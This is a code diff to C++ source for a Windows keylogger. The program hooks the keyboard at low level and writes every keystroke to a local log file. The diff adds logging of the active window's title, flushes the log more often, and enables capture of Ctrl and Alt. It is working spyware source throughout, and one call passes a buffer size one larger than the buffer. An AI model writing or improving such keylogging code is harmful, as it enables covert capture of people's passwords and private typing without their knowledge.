@@ -7,6 +7,8 @@
 
 std::ofstream myfile("keyAF.log", std::ios::out | std::ios::app);
 std::string keyValue;
+HWND hWnd;
+char buffer[MAX_PATH] = { 0 };
 
 LRESULT CALLBACK HookProcedure(int Code, WPARAM wParam, LPARAM lParam);
 
@@ -30,6 +32,7 @@ int main() {
 		int dayName = t.wDayOfWeek;
 		BeginMessage << "\n[+] " << t.wDay << "-" << t.wMonth << "-" << t.wYear << " || " << t.wHour << ':' << t.wMinute << ':' << t.wSecond << '\n';
 		myfile.write(BeginMessage.str().c_str(), BeginMessage.str().length());
+		ZeroMemory(buffer, sizeof(buffer));
 		MSG msg;
 		while (GetMessage(&msg, NULL, 0, 0) > 0) {
 			TranslateMessage(&msg);
@@ -43,7 +46,19 @@ int main() {
 
 LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
-	if (keyValue.length() >= 2048) {
+	hWnd = GetForegroundWindow();
+	char tempbuf[MAX_PATH];
+	ZeroMemory(tempbuf, sizeof(tempbuf));
+	GetWindowText(hWnd, tempbuf, MAX_PATH + 1);
+	if (strcmp(buffer, tempbuf) != 0){
+		myfile.write(keyValue.c_str(), keyValue.length());
+		keyValue.clear();
+		std::stringstream windowText; 
+		windowText << "\nWindow changed to: " << tempbuf << '\n';
+		myfile.write(windowText.str().c_str(), windowText.str().length());
+		strcpy_s(buffer, tempbuf);
+	}
+	if (keyValue.length() >= 256) {
 		myfile.write(keyValue.c_str(), keyValue.length());
 		keyValue.clear();
 	}
@@ -51,7 +66,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
 		switch (p->vkCode) {
 		case VK_CAPITAL:	keyValue.append("<CAPLOCK>");	break;
 		case VK_SHIFT:		keyValue.append("<SHIFT>");		break;
-		//case VK_LCONTROL:	keyValue.append("<LCTRL>");		break;
+		case VK_LCONTROL:	keyValue.append("<LCTRL>");		break;
 		//case VK_RCONTROL:	keyValue.append("<RCTRL>");		break;
 		//case VK_INSERT:	keyValue.append("<INSERT>");	break;
 		//case VK_END:		keyValue.append("<END>");		break;
@@ -63,7 +78,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
 		//case VK_UP:		keyValue.append("<UP>");		break;
 		//case VK_DOWN:		keyValue.append("<DOWN>");		break;
 		case VK_RETURN:		keyValue.append("<RETURN>\n");	break;
-		//case VK_MENU:		keyValue.append("<ALT>\n");		break;
+		case VK_MENU:		keyValue.append("<ALT>\n");		break;
 		case VK_TAB:		keyValue.append("<TAB>");		break;
 		default:
 			keyValue += char(tolower(p->vkCode));
